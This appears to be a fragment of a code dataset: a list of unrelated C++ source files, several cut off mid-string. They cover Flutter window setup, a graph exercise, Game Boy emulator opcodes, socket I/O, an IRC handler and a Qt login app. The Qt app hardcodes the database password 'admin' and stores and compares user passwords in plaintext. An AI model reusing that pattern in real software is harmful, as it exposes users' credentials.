__stdcall(HWND hwnd);\n\n// Scale helper to convert logical scaler values to physical using passed in\n// scale factor\nint Scale(int source, double scale_factor) {\n  return static_cast<int>(source * scale_factor);\n}\n\n// Dynamically loads the |EnableNonClientDpiScaling| from the User32 module.\n// This API is only needed for PerMonitor V1 awareness mode.\nvoid EnableFullDpiSupportIfAvailable(HWND hwnd) {\n  HMODULE user32_module = LoadLibraryA(\"User32.dll\");\n  if (!user32_module) {\n    return;\n  }\n  auto enable_non_client_dpi_scaling =\n      reinterpret_cast<EnableNonClientDpiScaling*>(\n          GetProcAddress(user32_module, \"EnableNonClientDpiScaling\"));\n  if (enable_non_client_dpi_scaling != nullptr) {\n    enable_non_client_dpi_scaling(hwnd);\n  }\n  FreeLibrary(user32_module);\n}\n\n}  // namespace\n\n// Manages the Win32Window's window class registration.\nclass WindowClassRegistrar {\n public:\n  ~WindowClassRegistrar() = default;\n\n  // Returns the singleton registrar instance.\n  static WindowClassRegistrar* GetInstance() {\n    if (!instance_) {\n      instance_ = new WindowClassRegistrar();\n    }\n    return instance_;\n  }\n\n  // Returns the name of the window class, registering the class if it hasn't\n  // previously been registered.\n  const wchar_t* GetWindowClass();\n\n  // Unregisters the window class. Should only be called if there are no\n  // instances of the window.\n  void UnregisterWindowClass();\n\n private:\n  WindowClassRegistrar() = default;\n\n  static WindowClassRegistrar* instance_;\n\n  bool class_registered_ = false;\n};\n\nWindowClassRegistrar* WindowClassRegistrar::instance_ = nullptr;\n\nconst wchar_t* WindowClassRegistrar::GetWindowClass() {\n  if (!class_registered_) {\n    WNDCLASS window_class{};\n    window_class.hCursor = LoadCursor(nullptr, IDC_ARROW);\n    window_class.lpszClassName = kWindowClassName;\n    window_class.style = CS_HREDRAW | CS_VREDRAW;\n    window_class.cbClsExtra = 0;\n    window_class.cbWndExtra = 0;\n    window_class.hInstance = GetModuleHandle(nullptr);\n    window_class.hIcon =\n        LoadIcon(window_class.hInstance, MAKEINTRESOURCE(IDI_APP_ICON));\n    window_class.hbrBackground = 0;\n    window_class.lpszMenuName = nullptr;\n    window_class.lpfnWndProc = Win32Window::WndProc;\n    RegisterClass(&window_class);\n    class_registered_ = true;\n  }\n  return kWindowClassName;\n}\n\nvoid WindowClassRegistrar::UnregisterWindowClass() {\n  UnregisterClass(kWindowClassName, nullptr);\n  class_registered_ = false;\n}\n\nWin32Window::Win32Window() {\n  ++g_active_window_count;\n}\n\nWin32Window::~Win32Window() {\n  --g_active_window_count;\n  Destroy();\n}\n\nbool Win32Window::Create(const std::wstring& title,\n                         const Point& origin,\n                         const Size& size) {\n  Destroy();\n\n  const wchar_t* window_class =\n      WindowClassRegistrar::GetInstance()->GetWindowClass();\n\n  const POINT target_point = {static_cast<LONG>(origin.x),\n                              static_cast<LONG>(origin.y)};\n  HMONITOR monitor = MonitorFromPoint(target_point, MONITOR_DEFAULTTONEAREST);\n  UINT dpi = FlutterDesktopGetDpiForMonitor(monitor);\n  double scale_factor = dpi / 96.0;\n\n  HWND window = CreateWindow(\n      window_class, title.c_str(), WS_OVERLAPPEDWINDOW,\n      Scale(origin.x, scale_factor), Scale(origin.y, scale_factor),\n      Scale(size.width, scale_factor), Scale(size.height, scale_factor),\n      nullptr, nullptr, GetModuleHandle(nullptr), this);\n\n  if (!window) {\n    return false;\n  }\n\n  UpdateTheme(window);\n\n  return OnCreate();\n}\n\nbool Win32Window::Show() {\n  return ShowWindow(window_handle_, SW_SHOWNORMAL);\n}\n\n// static\nLRESULT CALLBACK Win32Window::WndProc(HWND const window,\n                                      UINT const message,\n                                      WPARAM const wparam,\n                                      LPARAM const lparam) noexcept {\n  if (message == WM_NCCREATE) {\n    auto window_struct = reinterpret_cast<CREATESTRUCT*>(lparam);\n    S",
    "#define _CRT_SECURE_NO_WARNINGS\n#include <iostream>\nusing namespace std;\n\nconst int MAXV = 20;\nstruct MaTranKe {\n\tint mtk[MAXV][MAXV];\n\tint n;\n};\n\n//Ham doc ma tran ke tu file van ban\nbool docMaTran(const char* file, MaTranKe& maTran) {\n\tFILE* filePointer = fopen(file, \"rt\");\n\tif (filePointer == NULL) return false;\n\tfscanf(filePointer, \"%d\", &maTran.n);\n\tfor (int i = 0; i < maTran.n; i++)\n\t{\n\t\tfor (int j = 0; j < maTran.n; j++)\n\t\t{\n\t\t\tfscanf(filePointer, \"%d\", &maTran.mtk[i][j]);\n\t\t}\n\t}\n\tfclose(filePointer);\n\treturn true;\n}\n\n//Ham xuat ma tran ke\nvoid inMaTran(MaTranKe maTran) {\n\tfor (int i = 0; i < maTran.n; i++)\n\t{\n\t\tcout << endl;\n\t\tfor (int j = 0; j < maTran.n; j++)\n\t\t{\n\t\t\tcout << maTran.mtk[i][j] << \" \";\n\t\t}\n\t}\n}\n\n\n//Ham tra ve so canh cua do thi \nint demSoCanh(MaTranKe maTran) {\n\tint count = 0;\n\tfor (int i = 0; i < maTran.n; i++)\n\t{\n\t\tfor (int j = 0; j < maTran.n; j++)\n\t\t{\n\t\t\tif (maTran.mtk[i][j] != 0)\n\t\t\t\tcount++;\n\t\t}\n\t}\n\treturn count;\n}\n\n//Ham tinh bac ra cua dinh u trong do thi\nint soBacRa(MaTranKe maTran, int u) {\n\tint count = 0;\n\tfor (int i = 0; i < maTran.n; i++) {\n\t\tif (maTran.mtk[u][i] != 0) {\n\t\t\tcount++;\n\t\t}\n\t}\n\treturn count;\n}\n\n//Ham tim canh co trong so V lon nhat cua dinh U\nint timCanhLonNhatCuaDinh(MaTranKe maTran, int u, int& v) {\n\tfor (int i = 0; i < maTran.n; i++) {\n\t\tif (maTran.mtk[u][i] > v) {\n\t\t\tv = maTran.mtk[u][i];\n\t\t}\n\t}\n\treturn v;\n}\n\nint main() {\n\tMaTranKe maTran;\n\tif (docMaTran(\"MaTranKe.txt\", maTran) == true) {\n\t\tcout << \"Ma tran co: \";\n\t\tinMaTran(maTran);\n\t\tcout << \"\\nSo canh cua do thi: \" << demSoCanh(maTran);\n\t}\n\telse \n\t\tcout << \"\\nKhong doc duoc ma tran.\" << endl;\n\n\tint u;\n\tcout << \"\\n\\nNhap bac muon kiem tra so bac ra: \"; cin >> u;\n\tcout << \"Bac cua \"<< u << \": \"  << soBacRa(maTran, u);\n\n\tint x, v = 0;\n\tcout << \"\\n\\nNhap bac muon tim canh co trong so lon nhat: \"; cin >> x;\n\tcout << \"Canh co trong so lon nhat cua \" << x << \" la: \" << timCanhLonNhatCuaDinh(maTran, x, v);\n\n\treturn 0;\n}",
    "#include \"../cpu.h\"\n#include \"../../common/defs.h\"\n#include \"../../memory/memory.h\"\n\n#include <iostream>\n\nvoid CPU::load8bit(REGISTER *reg, uint8_t value)\n{\n    *reg = value;\n}\n\nNUM_CYCLES CPU::opcode0x7F()\n{\n    load8bit(&registers.a, registers.a);\n    return 4;\n} // LD A, AF.HIGH\n\nNUM_CYCLES CPU::opcode0x78()\n{\n    load8bit(&registers.a, registers.b);\n    return 4;\n} // LD A, BC.HIGH\n\nNUM_CYCLES CPU::opcode0x79()\n{\n    load8bit(&registers.a, registers.c);\n    return 4;\n} // LD A, BC.LOW\n\nNUM_CYCLES CPU::opcode0x7A()\n{\n    load8bit(&registers.a, registers.d);\n    return 4;\n} // LD A, DE.HIGH\n\nNUM_CYCLES CPU::opcode0x7B()\n{\n    load8bit(&registers.a, registers.e);\n    return 4;\n} // LD A, DE.LOW\n\nNUM_CYCLES CPU::opcode0x7C()\n{\n    load8bit(&registers.a, registers.h);\n    return 4;\n} // LD A, HL.HIGH\n\nNUM_CYCLES CPU::opcode0x7D()\n{\n    load8bit(&registers.a, registers.l);\n    return 4;\n} // LD A, HL.LOW\n\nNUM_CYCLES CPU::opcode0x7E()\n{\n    load8bit(&registers.a, memory->readByte(registers.hl));\n    return 8;\n} // LD A, (HL)\n\nNUM_CYCLES CPU::opcode0x3E()\n{\n    load8bit(&registers.a, memory->readByte(registers.pc + 1));\n    registers.pc += 1;\n    return 8;\n} // LD A, NUMBER\n\nNUM_CYCLES CPU::opcode0x47()\n{\n    load8bit(&registers.b, registers.a);\n    return 4;\n} // LD B, AF.HIGH\n\nNUM_CYCLES CPU::opcode0x40()\n{\n    load8bit(&registers.b, registers.b);\n    return 4;\n} // LD B, BC.HIGH\n\nNUM_CYCLES CPU::opcode0x41()\n{\n    load8bit(&registers.b, registers.c);\n    return 4;\n} // LD B, BC.LOW\n\nNUM_CYCLES CPU::opcode0x42()\n{\n    load8bit(&registers.b, registers.d);\n    return 4;\n} // LD B, DE.HIGH\n\nNUM_CYCLES CPU::opcode0x43()\n{\n    load8bit(&registers.b, registers.e);\n    return 4;\n} // LD B, DE.LOW\n\nNUM_CYCLES CPU::opcode0x44()\n{\n    load8bit(&registers.b, registers.h);\n    return 4;\n} // LD B, HL.HIGH\n\nNUM_CYCLES CPU::opcode0x45()\n{\n    load8bit(&registers.b, registers.l);\n    return 4;\n} // LD B, HL.LOW\n\nNUM_CYCLES CPU::opcode0x46()\n{\n    load8bit(&registers.b, memory->readByte(registers.hl));\n    return 8;\n} // LD B, (HL)\n\nNUM_CYCLES CPU::opcode0x06()\n{\n    load8bit(&registers.b, memory->readByte(registers.pc + 1));\n    registers.pc += 1;\n    return 8;\n} // LD B, NUMBER\n\nNUM_CYCLES CPU::opcode0x4F()\n{\n    load8bit(&registers.c, registers.a);\n    return 4;\n} // LD C, AF.HIGH\n\nNUM_CYCLES CPU::opcode0x48()\n{\n    load8bit(&registers.c, registers.b);\n    return 4;\n} // LD C, BC.HIGH\n\nNUM_CYCLES CPU::opcode0x49()\n{\n    load8bit(&registers.c, registers.c);\n    return 4;\n} // LD C, BC.LOW\n\nNUM_CYCLES CPU::opcode0x4A()\n{\n    load8bit(&registers.c, registers.d);\n    return 4;\n} // LD C, DE.HIGH\n\nNUM_CYCLES CPU::opcode0x4B()\n{\n    load8bit(&registers.c, registers.e);\n    return 4;\n} // LD C, DE.LOW\n\nNUM_CYCLES CPU::opcode0x4C()\n{\n    load8bit(&registers.c, registers.h);\n    return 4;\n} // LD C, HL.HIGH\n\nNUM_CYCLES CPU::opcode0x4D()\n{\n    load8bit(&registers.c, registers.l);\n    return 4;\n} // LD C, HL.LOW\n\nNUM_CYCLES CPU::opcode0x4E()\n{\n    load8bit(&registers.c, memory->readByte(registers.hl));\n    return 8;\n} // LD C, (HL)\n\nNUM_CYCLES CPU::opcode0x0E()\n{\n    load8bit(&registers.c, memory->readByte(registers.pc + 1));\n    registers.pc += 1;\n    return 8;\n} // LD C, NUMBER\n\nNUM_CYCLES CPU::opcode0x57()\n{\n    load8bit(&registers.d, registers.a);\n    return 4;\n} // LD D, AF.HIGH\n\nNUM_CYCLES CPU::opcode0x50()\n{\n    load8bit(&registers.d, registers.b);\n    return 4;\n} // LD D, BC.HIGH\n\nNUM_CYCLES CPU::opcode0x51()\n{\n    load8bit(&registers.d, registers.c);\n    return 4;\n} // LD D, BC.LOW\n\nNUM_CYCLES CPU::opcode0x52()\n{\n    load8bit(&registers.d, registers.d);\n    return 4;\n} // LD D, DE.HIGH\n\nNUM_CYCLES CPU::opcode0x53()\n{\n    load8bit(&registers.d, registers.e);\n    return 4;\n} // LD D, DE.LOW\n\nNUM_CYCLES CPU::opcode0x54()\n{\n    load8bit(&registers.d, registers.h);\n    return 4;\n} // LD D, HL.HIGH\n\nNUM_CYCLES CPU::opcode0x55()\n{\n    load8bit(&registers.d, registers.l);\n    return 4;\n} // LD D, HL.LOW\n\nNUM_CYCLES CPU::opcode0x56()\n{\n    load8bit(&registers.d, memory->readByte(registers.hl));\n    return 8;\n} // LD D, (HL)\n\nNUM_CYCLES CPU::opcode0x16()\n{\n    load8bit(&registers.d, memory->readByte(registers.pc + 1));\n    registers.pc += 1;\n    return 8;\n} // LD D, NUMBER\n\nNUM_CYCLES CPU::opcode0x5F()\n{\n    load8bit(&registers.e, registers.a);\n    return 4;\n} // LD E, AF.HIGH\n\nNUM_CYCLES CPU::opcode0x58()\n{\n    load8bit(&registers.e, registers.b);\n    return 4;\n} // LD E, BC.HIGH\n\nNUM_CYCLES CPU::opcode0x59()\n{\n    load8bit(&registers.e, registers.c);\n    return 4;\n} // LD E, BC.LOW\n\nNUM_CYCLES CPU::opcode0x5A()\n{\n    load8bit(&registers.e, registers.d);\n    return 4;\n} // LD E, DE.HIGH\n\nNUM_CYCLES CPU::opcode0x5B()\n{\n    load8bit(&registers.e, registers.e);\n    return 4;\n} // LD E, DE.LOW\n\nNUM_CYCLES CPU::opcode0x5C()\n{\n    load8bit(&registers.e, registers.h);\n    return 4;\n} // LD E, HL.HIGH\n\nNUM_CYCLES CPU::opcode0x5D()\n{\n    load8bit(&registers.e, registers.l);\n    return 4;\n} // LD E, HL.LOW\n\nNUM_CYCLES CPU::opcode0x5E()\n{\n    ",
    "/**\n * Project Reactor\n */\n\n#include <sys/types.h>\n#include <sys/socket.h>\n\n#include <iostream>\n\n#include \"SocketIO.h\"\n#include \"macro.h\"\n\n/**\n * SocketIO implementation\n */\n\n\n/**\n * @param fd\n */\nSocketIO::SocketIO(int fd)\n:_fd(fd)\n{}\n\n/**\n * @param buf\n * @param len\n * @return int\n */\nint SocketIO::readn(char * buf, int len) {\n    int total = len;\n    while(len > 0){\n        int sret = recv(_fd,buf,len,0);\n        if(sret == -1 && errno == EINTR){\n            continue;\n        }\n        ERROR_CHECK(sret,-1,\"recv on readn\");\n        if(sret == 0){\n            std::cout << \"client closed!!!\\n\";\n            break;\n        }\n        buf += sret;\n        len -= sret;\n    }\n    return total - len;\n}\n\n/**\n * @param buf\n * @param len\n * @return int\n */\nint SocketIO::writen(const char * buf, int len) {\n    int total = len;\n    while(len > 0){\n        int sret = send(_fd,buf,len,0);\n        if(sret == -1 && errno == EINTR){\n            continue;\n        }\n        ERROR_CHECK(sret,-1,\"send on writen\");\n        if(sret == 0){\n            break;\n        }\n        buf += sret;\n        len -= sret;\n    }\n    return total - len;\n}\n\n/**\n * @param buf\n * @param len\n * @return int\n */\nint SocketIO::readline(char * buf, int len) {\n    int total = len;\n    while(len > 0){\n        // \u4e0d\u6e05\u9664\u7f13\u51b2\u533a\u7684\u8bfb\u53d6\n        int sret = recv(_fd,buf,len,MSG_PEEK);\n        if(sret == -1 && errno == EINTR){\n            continue;\n        }\n        ERROR_CHECK(sret,-1,\"recv on readn\");\n        if(sret == 0){\n            std::cout << \"client closed!!!\\n\";\n            break;\n        }\n        // \u67e5\u627e\u662f\u5426\u5b58\u5728\u6362\u884c\n        for(int i = 0; i < sret; ++i){\n            if(buf[i] == '\\n'){\n                sret = recv(_fd,buf,i+1,0);\n                return total - len - sret;\n            }\n        }\n        // \u6ca1\u6709\u5219\u6e05\u9664\u7f13\u51b2\u533a\u5e76\u7ee7\u7eedpeek\n        recv(_fd,buf,sret,0);\n        buf += sret;\n        len -= sret;\n    }\n    return total - len;\n}\n",
    "#include \"main.h\"\n\n\nMainApp::MainApp(int argc, char *argv[]) : QApplication(argc, argv) {\n    db = QSqlDatabase::addDatabase(\"QPSQL\");\n    db.setHostName(\"localhost\");\n    db.setDatabaseName(\"postgres\");\n    db.setUserName(\"postgres\");\n    db.setPassword(\"admin\");\n\n    w = new initial;\n    w2 = new regestration;\n    admpanel = new adminpanel;\n    userpanel = new UserPanel;\n\n    if (!db.open()) {\n        qDebug() << \"Failed to open database:\" << db.lastError().text();\n        return;\n    }\n\n    w->show();\n    w->setWindowTitle(\"\u0420\u0435\u0433\u0438\u0441\u0442\u0440\u0430\u0446\u0438\u044f || \u0412\u0445\u043e\u0434\");\n    QIcon qic1(\":/image/app_icon\");\n    w->setWindowIcon(qic1);\n\n    connect(w, &initial::openRegistrationWindow, this, &MainApp::openRegistrationWindow);\n    connect(w2, &regestration::RegistrUser, this, &MainApp::PushRegistrButton);\n    connect(w, &initial::LoginUser, this, &MainApp::PushLoginButton);\n    connect(admpanel, &adminpanel::addUser, this, &MainApp::AddUser);\n    connect(admpanel, &adminpanel::deleteUser, this, &MainApp::DeleteUser);\n    connect(userpanel, &UserPanel::addLine, this, &MainApp::AddLine);\n    connect(userpanel, &UserPanel::deleteLine, this, &MainApp::DeleteLine);\n\n}\n\n\n\nvoid MainApp::openRegistrationWindow() {\n    w2->setWindowTitle(\"\u0420\u0435\u0433\u0438\u0441\u0442\u0440\u0430\u0446\u0438\u044f\");\n    w2->show();\n    w->hide();\n}\n\n\nvoid MainApp::PushRegistrButton()\n{\n    QString login = w2->login;\n    QString password = w2->password;\n\n    QSqlQuery query(db);\n    query.prepare(\"INSERT INTO users (login, password) VALUES (:login, :password)\");\n    query.bindValue(\":login\", login);\n    query.bindValue(\":password\", password);\n\n    if (!query.exec()) {\n        qDebug() << \"Error executing query:\" << query.lastError().text();\n        QString error = query.lastError().text();\n        QMessageBox::warning(w2, \"\u041e\u0448\u0438\u0431\u043a\u0430\", error, QMessageBox::Ok);\n\n\n    } else {\n        qDebug() << \"User registered successfully\";\n        QMessageBox::information(w2, \"\u0423\u0441\u043f\u0435\u0445!\", \"\u0412\u044b \u0443\u0441\u043f\u0435\u0448\u043d\u043e \u0437\u0430\u0440\u0435\u0433\u0435\u0441\u0442\u0440\u0438\u0440\u043e\u0432\u0430\u043b\u0438\u0441\u044c!\", QMessageBox::Ok);\n    }\n}\n\n\nvoid MainApp::PushLoginButton()\n{\n    QString login = w->login;\n    QString password = w->password;\n\n    bool isAdmin = checkUserStatus(login, password);\n\n    if (isAdmin) {\n        w->close();\n\n        QSqlQuery query1(db);\n        query1.exec(\"SELECT * FROM users;\");\n\n        modal = new QSqlTableModel(this, db);\n        modal->setTable(\"users\");\n        modal->select();\n        admpanel->uiadpanel->tableView->setModel(modal);\n        admpanel->show();\n\n    } else if (!isAdmin) {\n        w->close();\n        QSqlQuery query1(db);\n        query1.exec(\"SELECT * FROM warehouse;\");\n         modal = new QSqlTableModel(this, db);\n        modal->setTable(\"warehouse\");\n        modal->select();\n\n        userpanel->ui->tableView->setModel(modal);\n        userpanel->show();\n    }\n}\n\nvoid MainApp::DeleteUser() {\n    modal->removeRow(admpanel->row);\n    modal->select();\n}\n\nvoid MainApp::AddUser()\n{\n    modal->insertRow(modal->rowCount());\n}\n\nvoid MainApp::DeleteLine() {\n    modal->removeRow(userpanel->row);\n    modal->select();\n}\n\nvoid MainApp::AddLine()\n{\n    modal->insertRow(modal->rowCount());\n}\n\nbool MainApp::checkUserStatus(const QString& login, const QString& password) {\n    QSqlQuery query;\n    query.prepare(\"SELECT status FROM users WHERE login = :login AND password = :password\");\n    query.bindValue(\":login\", login);\n    query.bindValue(\":password\", password);\n\n    if (query.exec()) {\n        if (query.next()) {\n            bool isAdmin = query.value(0).toBool();\n            return isAdmin;\n        }\n    }\n\n    return false;\n}\n\n\nMainApp::~MainApp() {\n    delete w;\n    delete w2;\n    delete userpanel;\n    delete admpanel;\n    db.close();\n}\n\n\n\nint main(int argc, char *argv[]) {\n\n\n    MainApp app(argc, argv);\n\n    return app.exec();\n\n}\n",
    "#include \"gm.hpp\"\n\n#include <boost/foreach.hpp>\n#include <boost/algorithm/string.hpp>\n#include <boost/graph/dijkstra_shortest_paths.hpp>\n\n#include <iostream>\n#include <regex>\n#include <sstream>\n#include <set>\n\ntypedef boost::graph_traits<GMGraph>::vertex_descriptor vertex_descriptor;\ntypedef boost::graph_traits<GMGraph>::edge_descriptor edge_descriptor;\n\nusing namespace std;\n\n/*\n    Function: get_dfs_gm_nodes\n    Objective: Go through the GM using DFS and return nodes in the order they are visited\n\n    @ Input 1: The GMGraph representing the GM\n    @ Output: The vertices indexes based on DFS visit\n*/  \nvector<int> get_dfs_gm_nodes(GMGraph gm) {\n    auto indexmap = boost::get(boost::vertex_index, gm);\n    auto colormap = boost::make_vector_property_map<boost::default_color_type>(indexmap);\n\n    DFSVisitor vis;\n    boost::depth_first_search(gm, vis, colormap, 0);\n\n    return vis.GetVector();\n}\n\nbool exists_path(int source, int target, GMGraph gm) {\n    int vertices_number = boost::num_vertices(gm);\n\n    vector<bool> visited(vertices_number, false);\n    visited[source] = true;\n    \n    std::stack<int> next;\n    next.push(source);\n\n    while(!next.empty()) {\n        int current_vertex = next.top();\n        next.pop();\n\n        for(int next_vertex = 0; next_vertex < vertices_number; next_vertex++) {\n            if(!visited[next_vertex] && std::find(gm[current_vertex].children.begin(), gm[current_vertex].children.end(), next_vertex) != gm[current_vertex].children.end()) {\n                visited[next_vertex] = true;\n                next.push(next_vertex);\n            }\n        }\n    }\n\n    return visited[target];\n}\n\n/*\n    Function: check_gm_validity\n    Objective: Go through the GMGraph representing the goal model and verify if it is valid. Here we mainly check\n    if AchieveConditions are correctly constructed (if variables are declared). If invalid\n    we throw an error at the first invalid construct we find.\n\n    @ Input 1: The GMGraph representing the GM\n    @ Output: Void. We only throw errors\n*/ \nvoid check_gm_validity(GMGraph gm) {\n    vector<int> vctr = get_dfs_gm_nodes(gm);\n\n    map<string,string> declared_vars;\n\n    for(int v : vctr) {\n        string goal_type = get<string>(gm[v].custom_props[goal_type_prop]);\n\n        vector<pair<string,string>> monitored_vars;\n        if(holds_alternative<vector<pair<string,string>>>(gm[v].custom_props[monitors_prop])) {\n            monitored_vars = std::get<vector<pair<string,string>>>(gm[v].custom_props[monitors_prop]);\n        }\n\n        pair<bool,pair<string,string>> undeclared_var;\n        undeclared_var.first = false;\n        \n        for(pair<string,string> var : monitored_vars) {\n            if(declared_vars.find(var.first) == declared_vars.end()) {\n                undeclared_var.first = true;\n                undeclared_var.second = var;\n            }\n        }\n\n        if(undeclared_var.first) {\n            string undeclared_variable_error = \"Undeclared variable [\" + undeclared_var.second.first + \"] of type [\" + undeclared_var.second.second + \"] in goal \" + get_node_name(gm[v].text);\n\n            throw std::runtime_error(undeclared_variable_error);\n        }\n\n        vector<pair<string,string>> controlled_vars;\n        if(holds_alternative<vector<pair<string,string>>>(gm[v].custom_props[controls_prop])) {\n            controlled_vars = std::get<vector<pair<string,string>>>(gm[v].custom_props[controls_prop]);\n        }\n\n        for(pair<string,string> var : controlled_vars) {\n            if(declared_vars.find(var.first) == declared_vars.end()) {\n                declared_vars[var.first] = var.second;\n            } else {\n                string var_redeclaration_error = \"Redeclaration of variable [\" + var.first + \"] in goal \" + get_node_name(gm[v].text);\n\n                throw std::runtime_error(var_redeclaration_error); \n            }\n        }\n\n        if(goal_type == achieve_goal_type) {\n            AchieveCondition ac = std::get<AchieveCondition>(gm[v].custom_props[achieve_condition_prop]);\n            \n            if(ac.has_forAll_expr) {\n                bool found_iterated_var = false;\n                for(auto monitored : monitored_vars) {\n                    if(monitored.first == ac.get_iterated_var()) {\n                        found_iterated_var = true;\n                        break;\n                    }\n                }\n                if(!found_iterated_var) {\n                    string iterated_var_err = \"Did not find iterated variable \" + ac.get_iterated_var() + \" in \" + get_node_name(gm[v].text) + \"'s controlled variables list\";\n                    throw std::runtime_error(iterated_var_err);\n                }\n\n                bool found_iteration_var = false;\n                for(auto controlled : controlled_vars) {\n                    if(controlled.first == ac.get_iteration_var()) {\n                        found_iteration_var = true;\n                        break;\n                    }\n                }\n                if(!found_iteration_var) {\n ",
    "#include \"win32_window.h\"\n\n#include <dwmapi.h>\n#include <flutter_windows.h>\n\n#include \"resource.h\"\n\nnamespace {\n\n/// Window attribute that enables dark mode window decorations.\n///\n/// Redefined in case the developer's machine has a Windows SDK older than\n/// version 10.0.22000.0.\n/// See: https://docs.microsoft.com/windows/win32/api/dwmapi/ne-dwmapi-dwmwindowattribute\n#ifndef DWMWA_USE_IMMERSIVE_DARK_MODE\n#define DWMWA_USE_IMMERSIVE_DARK_MODE 20\n#endif\n\nconstexpr const wchar_t kWindowClassName[] = L\"FLUTTER_RUNNER_WIN32_WINDOW\";\n\n/// Registry key for app theme preference.\n///\n/// A value of 0 indicates apps should use dark mode. A non-zero or missing\n/// value indicates apps should use light mode.\nconstexpr const wchar_t kGetPreferredBrightnessRegKey[] =\n  L\"Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Themes\\\\Personalize\";\nconstexpr const wchar_t kGetPreferredBrightnessRegValue[] = L\"AppsUseLightTheme\";\n\n// The number of Win32Window objects that currently exist.\nstatic int g_active_window_count = 0;\n\nusing EnableNonClientDpiScaling = BOOL __stdcall(HWND hwnd);\n\n// Scale helper to convert logical scaler values to physical using passed in\n// scale factor\nint Scale(int source, double scale_factor) {\n  return static_cast<int>(source * scale_factor);\n}\n\n// Dynamically loads the |EnableNonClientDpiScaling| from the User32 module.\n// This API is only needed for PerMonitor V1 awareness mode.\nvoid EnableFullDpiSupportIfAvailable(HWND hwnd) {\n  HMODULE user32_module = LoadLibraryA(\"User32.dll\");\n  if (!user32_module) {\n    return;\n  }\n  auto enable_non_client_dpi_scaling =\n      reinterpret_cast<EnableNonClientDpiScaling*>(\n          GetProcAddress(user32_module, \"EnableNonClientDpiScaling\"));\n  if (enable_non_client_dpi_scaling != nullptr) {\n    enable_non_client_dpi_scaling(hwnd);\n  }\n  FreeLibrary(user32_module);\n}\n\n}  // namespace\n\n// Manages the Win32Window's window class registration.\nclass WindowClassRegistrar {\n public:\n  ~WindowClassRegistrar() = default;\n\n  // Returns the singleton registrar instance.\n  static WindowClassRegistrar* GetInstance() {\n    if (!instance_) {\n      instance_ = new WindowClassRegistrar();\n    }\n    return instance_;\n  }\n\n  // Returns the name of the window class, registering the class if it hasn't\n  // previously been registered.\n  const wchar_t* GetWindowClass();\n\n  // Unregisters the window class. Should only be called if there are no\n  // instances of the window.\n  void UnregisterWindowClass();\n\n private:\n  WindowClassRegistrar() = default;\n\n  static WindowClassRegistrar* instance_;\n\n  bool class_registered_ = false;\n};\n\nWindowClassRegistrar* WindowClassRegistrar::instance_ = nullptr;\n\nconst wchar_t* WindowClassRegistrar::GetWindowClass() {\n  if (!class_registered_) {\n    WNDCLASS window_class{};\n    window_class.hCursor = LoadCursor(nullptr, IDC_ARROW);\n    window_class.lpszClassName = kWindowClassName;\n    window_class.style = CS_HREDRAW | CS_VREDRAW;\n    window_class.cbClsExtra = 0;\n    window_class.cbWndExtra = 0;\n    window_class.hInstance = GetModuleHandle(nullptr);\n    window_class.hIcon =\n        LoadIcon(window_class.hInstance, MAKEINTRESOURCE(IDI_APP_ICON));\n    window_class.hbrBackground = 0;\n    window_class.lpszMenuName = nullptr;\n    window_class.lpfnWndProc = Win32Window::WndProc;\n    RegisterClass(&window_class);\n    class_registered_ = true;\n  }\n  return kWindowClassName;\n}\n\nvoid WindowClassRegistrar::UnregisterWindowClass() {\n  UnregisterClass(kWindowClassName, nullptr);\n  class_registered_ = false;\n}\n\nWin32Window::Win32Window() {\n  ++g_active_window_count;\n}\n\nWin32Window::~Win32Window() {\n  --g_active_window_count;\n  Destroy();\n}\n\nbool Win32Window::Create(const std::wstring& title,\n                         const Point& origin,\n                         const Size& size) {\n  Destroy();\n\n  const wchar_t* window_class =\n      WindowClassRegistrar::GetInstance()->GetWindowClass();\n\n  const POINT target_point = {static_cast<LONG>(origin.x),\n                              static_cast<LONG>(origin.y)};\n  HMONITOR monitor = MonitorFromPoint(target_point, MONITOR_DEFAULTTONEAREST);\n  UINT dpi = FlutterDesktopGetDpiForMonitor(monitor);\n  double scale_factor = dpi / 96.0;\n\n  HWND window = CreateWindow(\n      window_class, title.c_str(), WS_OVERLAPPEDWINDOW,\n      Scale(origin.x, scale_factor), Scale(origin.y, scale_factor),\n      Scale(size.width, scale_factor), Scale(size.height, scale_factor),\n      nullptr, nullptr, GetModuleHandle(nullptr), this);\n\n  if (!window) {\n    return false;\n  }\n\n  UpdateTheme(window);\n\n  return OnCreate();\n}\n\nbool Win32Window::Show() {\n  return ShowWindow(window_handle_, SW_SHOWNORMAL);\n}\n\n// static\nLRESULT CALLBACK Win32Window::WndProc(HWND const window,\n                                      UINT const message,\n                                      WPARAM const wparam,\n                                      LPARAM const lparam) noexcept {\n  if (message == WM_NCCREATE) {\n    auto window_struct = reinterpret_cast<CREATESTRUCT*>(lparam);\n    S",
    "/* ************************************************************************** */\r\n/*                                                                            */\r\n/*                                                        :::      ::::::::   */\r\n/*   pong.cpp                                           :+:      :+:    :+:   */\r\n/*                                                    +:+ +:+         +:+     */\r\n/*   By: igeorge <igeorge@student.42lyon.fr>        +#+  +:+       +#+        */\r\n/*                                                +#+#+#+#+#+   +#+           */\r\n/*   Created: 2023/07/25 20:50:14 by igeorge           #+#    #+#             */\r\n/*   Updated: 2023/07/25 20:50:14 by igeorge          ###   ########.fr       */\r\n/*                                                                            */\r\n/* ************************************************************************** */\r\n\r\n#include \"../../includes/commands/Command.hpp\"\r\n\r\nvoid   pong(const std::string &message, Client *client, Server *server)\r\n{\r\n    std::stringstream\toutput;\r\n\r\n\tif (message == \"ircserv\")\r\n\t{\r\n\t\toutput.str(\"\");\r\n\t\toutput << clientId(client->getNickname(), client->getUsername(), client->getHostname()) << \" PONG \" << message;\r\n\t\tsend_to_client_things(output.str(), client->getFd(), server);\r\n\t}\r\n\telse\r\n\t\tE402(client->getFd(), client->getNickname(), server, message);\r\n}\r\n ",
    "// This is preliminary experiment for C++ Frame Engine Project\n\n// Project status: toy\n// Requires: C++23 is the target. seriously. need features. absolutely. minimal support is llvm17 -std=c++23\n// Author: The Old Man\n// License: Public Domain\n// Flaws: it's a demonstrator of mechanics design. for the sake of explanation clarity, it does not care about exceptions. don't use for production\n\n#include <iostream>\n#include <string>\n#include <sstream>\n#include <iomanip>\n#include <utility>\n#include <initializer_list>\n\n#include <deque>\n#include <stack>  \n#include <map>\n#include <list>\n\n// Frame.\n// Frame is a fundamental concept here\n// This one is an exemplary frame, not generic one. in project, frame will become a templated abstraction \n// Frame is a closure for a frame-specific language. we construct an interpreter for that language\n//   - the language construction here is not part of the frame by design, to demonstrate ability to augment foreign c++ objects for scripting.\n//   - interpreter 